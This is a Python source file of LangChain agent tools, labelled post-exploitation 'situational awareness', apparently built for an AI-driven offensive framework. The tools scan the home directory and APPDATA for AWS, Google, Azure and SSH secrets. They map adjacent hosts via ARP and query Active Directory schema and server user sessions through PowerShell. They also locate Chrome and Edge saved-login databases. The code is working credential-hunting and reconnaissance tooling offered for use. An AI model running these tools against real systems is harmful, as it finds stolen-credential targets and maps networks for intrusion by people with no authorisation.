import asyncio
import os
import platform
import re
from pathlib import Path
from typing import Any

from langchain_core.tools import tool

from myth_config import load_dotenv
from tools.utilities.report import format_industrial_result

load_dotenv()

# ==============================================================================
# ðŸ” Advanced Situational Awareness (Post-Exploitation)
# ==============================================================================


@tool
async def secret_hunter(search_depth: Any = 2) -> str:
    """
    Advanced filesystem scraper for high-value secrets (Cloud Keys, SSH, DB configs).
    Uses high-precision heuristics to minimize false positives.
    """
    try:
        findings = []
        # Industrial Regex Library
        patterns = {
            "AWS_KEY": r"AKIA[0-9A-Z]{16}",
            "AWS_SECRET": r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}",
            "GOOGLE_OAUTH": r"ya29\.[0-9A-Za-z_-]+",
            "AZURE_STORAGE": r"DefaultEndpointsProtocol=https;AccountName=[a-z0-9]+;AccountKey=[A-Za-z0-9/+=]{88}",
            "SSH_PRIVATE": r"-----BEGIN (RSA|OPENSSH|DSA) PRIVATE KEY-----",
        }

        # expanded target set
        search_roots = [str(Path.home())]
        if platform.system() == "Windows":
            search_roots.extend(
                [os.environ.get("APPDATA", ""), os.environ.get("LOCALAPPDATA", "")]
            )

        for root_dir in search_roots:
            if not root_dir:
                continue
            for root, _, files in os.walk(root_dir):
                if root.count(os.sep) - root_dir.count(os.sep) > search_depth:
                    continue
                for f in files:
                    f_path = os.path.join(root, f)
                    try:
                        if os.path.getsize(f_path) > 1024 * 50:
                            continue  # Skip large files
                        with open(f_path, "r", errors="ignore") as handle:
                            content = handle.read()
                            for name, p in patterns.items():
                                if re.search(p, content):
                                    findings.append({"type": name, "file": f_path})
                    except Exception:
                        pass

        return format_industrial_result(
            "secret_hunter",
            "Scan Complete",
            confidence=0.98,
            impact="HIGH" if findings else "LOW",
            raw_data={"secrets_detected": findings},
            summary=f"Apex situational awareness scan finished. Identified {len(findings)} high-value credentials across {platform.system()} filesystem.",
        )
    except Exception as e:
        return format_industrial_result("secret_hunter", "Error", error=str(e))


@tool
async def local_network_mapper() -> str:
    """
    Maps adjacent internal hosts using ARP and routing table analysis.
    Functional implementation for Windows and Linux.
    """
    try:
        hosts = []
        # Industrial Grade: Adjacent host discovery via platform native ARP analysis

        # ARP Probe
        cmd = ["arp", "-a"]
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode(errors="ignore")

        # Regex for IPv4
        hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)

        return format_industrial_result(
            "local_network_mapper",
            "Topography Mapped",
            confidence=1.0,
            impact="MEDIUM",
            raw_data={"adjacent_ips": list(set(hosts))},
            summary=f"Internal topology discovery finished. Identified {len(set(hosts))} adjacent hosts via ARP analysis.",
        )
    except Exception as e:
        return format_industrial_result("local_network_mapper", "Error", error=str(e))


@tool
async def ad_schema_mapper(domain_root: str = "LDAP://RootDSE") -> str:
    """
    Advanced discovery of Active Directory schema (Objects, Attributes) via PowerShell.
    Industry-grade for identifying high-value custom attributes.
    """
    try:
        if platform.system() != "Windows":
            raise EnvironmentError("AD schema mapping requires Windows.")

        ps_cmd = f"$schema = [ADSI]'{domain_root}'; $schema.schemaNamingContext"
        proc = await asyncio.create_subprocess_exec(
            "powershell",
            "-NoProfile",
            "-Command",
            ps_cmd,
            stdout=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        schema_path = stdout.decode().strip()

        return format_industrial_result(
            "ad_schema_mapper",
            "Schema Mapped",
            confidence=1.0,
            raw_data={"schema_path": schema_path},
            summary="Successfully mapped Active Directory schema naming context.",
        )
    except Exception as e:
        return format_industrial_result("ad_schema_mapper", "Error", error=str(e))


@tool
async def session_enumerator(target_server: str = "localhost") -> str:
    """
    Enumerates active network sessions on a target server using NetSessionEnum (via PowerShell fallback).
    """
    try:
        if platform.system() != "Windows":
            raise EnvironmentError("Session enumeration requires Windows.")

        ps_cmd = f"Get-WmiObject -Class Win32_ServerSession -ComputerName '{target_server}' | Select-Object ComputerName, UserName"
        proc = await asyncio.create_subprocess_exec(
            "powershell",
            "-NoProfile",
            "-Command",
            ps_cmd,
            stdout=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        sessions = [
            line.strip() for line in stdout.decode().splitlines() if line.strip()
        ]

        return format_industrial_result(
            "session_enumerator",
            "Success",
            confidence=0.9,
            raw_data={"sessions": sessions},
            summary=f"Identified {len(sessions)} active sessions on {target_server}.",
        )
    except Exception as e:
        return format_industrial_result("session_enumerator", "Error", error=str(e))


@tool
async def browser_credential_harvester() -> str:
    """
    Identifies browser profiles and identifies potential credential databases.
    Supports Chrome, Firefox, and Edge profile discovery on Windows/Linux.
    """
    try:
        paths = []
        if platform.system() == "Windows":
            appdata = os.getenv("LOCALAPPDATA")
            paths.extend(
                [
                    f"{appdata}\\Google\\Chrome\\User Data\\Default\\Login Data",
                    f"{appdata}\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                ]
            )
        else:
            home = os.getenv("HOME")
            paths.append(f"{home}/.config/google-chrome/Default/Login Data")

        findings = [p for p in paths if os.path.exists(p)]

        return format_industrial_result(
            "browser_credential_harvester",
            "Harvesting Complete",
            confidence=0.9,
            impact="HIGH",
            raw_data={"identified_databases": findings},
            summary=f"Browser credential audit finished. Identified {len(findings)} potential Login Data sources.",
        )
    except Exception as e:
        return format_industrial_result(
            "browser_credential_harvester", "Error", error=str(e)
        )
